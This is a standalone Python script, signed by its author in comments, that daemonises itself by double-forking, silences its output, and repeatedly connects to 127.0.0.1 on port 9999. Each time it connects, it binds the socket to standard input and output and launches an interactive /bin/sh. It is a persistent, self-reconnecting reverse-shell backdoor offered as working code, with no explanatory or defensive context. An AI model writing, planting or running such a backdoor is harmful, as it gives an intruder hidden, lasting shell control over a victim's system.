#!/usr/bin/env python

# David Reguera Garcia aka Dreg
# https://github.com/David-Reguera-Garcia-Dreg/
# http://www.fr33project.org
# dreg@fr33project.org

import socket,subprocess,os,sys, time

pidrg = os.fork()
if pidrg > 0:
        sys.exit(0)

os.chdir("/")
os.setsid()
os.umask(0)
drgpid = os.fork()
if drgpid > 0:
        sys.exit(0)

while 1:
        try:
                sys.stdout.flush()

                sys.stderr.flush()

                fdreg = open("/dev/null", "w")

                sys.stdout = fdreg

                sys.stderr = fdreg

                sdregs=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

                sdregs.connect(("127.0.0.1",9999))

                os.dup2(sdregs.fileno(),0)

                os.dup2(sdregs.fileno(),1)

                os.dup2(sdregs.fileno(),2)

                p=subprocess.call(["/bin/sh","-i"])

                sdregs.close()

        except Exception:
                pass

        time.sleep(2)